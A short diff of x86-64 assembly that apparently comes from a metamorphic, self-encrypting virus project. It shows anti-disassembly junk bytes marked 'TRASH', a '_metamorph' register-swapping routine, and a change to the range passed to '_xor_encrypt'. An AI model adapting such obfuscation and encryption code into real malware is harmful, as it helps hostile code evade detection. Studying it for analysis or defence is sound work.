@@ -118,7 +118,6 @@ _h3ll0w0rld:
 		pop rcx
 		nop
 		call _ft_memmem
-
 		jmp $+4
 		db `\x88\x66`; TRASH;
 		jmp $+5
@@ -1342,7 +1341,7 @@ _metamorph:; (rdi -> ptr)
 	; swap registry r8, r9 -> r9, r10 -> ... -> r14, r15 -> r8, r9 -> ...
 
 	lea rax, [rel _params]
-	lea rsi, [rel _ft_strlen]
+	lea rsi, [rel _exit]
 	lea rcx, [rel _xor_encrypt]
 	sub rsi, rcx
 	sub rcx, rax
